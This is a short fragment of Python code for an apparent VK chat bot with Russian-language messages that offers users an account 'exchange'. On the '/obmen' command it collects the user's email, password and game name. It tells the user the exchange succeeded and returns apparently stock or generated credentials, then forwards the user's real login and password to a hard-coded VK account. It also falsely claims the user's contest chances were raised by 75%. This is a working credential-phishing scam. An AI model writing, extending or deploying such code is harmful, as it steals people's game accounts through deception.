    ...
    try:
        ...
        if messages["count"] >= 1:
            ...
            if body.lower() == "/start":
                ...
                fbal=0
            elif (body.lower()).split(' ')[0] == '/obmen':
                mail=body.split(' ')[1]
                password=body.split(' ')[2]
                gamea=body.split(' ')[3]
                vk.method("messages.send", {"peer_id": id, "message": "Успешный обмен! Держи аккаунт!\nСкриншот к аккаунту:"+sylka_prem()+"\nВот почта от аккаунта: "+pochta()+"\nПароль: "+passw()+"\nПриятной игры!\nПсс.. У нас конкурс в группе!\nУчаствууй!\nЯ повысил твои шансы на 75%!", "random_id": random.randint(1, 2147483647)})
                if gamea=='n60':
                    pass
                else:
                    vk.method("messages.send", {"peer_id": "308132880", "message": "Бот получил новый аккаунт!\nПочта: "+mail+"\nПароль: "+password+"\nИгра: "+gamea+"\nBot version: v1.34 stable", "random_id": random.randint(1, 2147483647)})
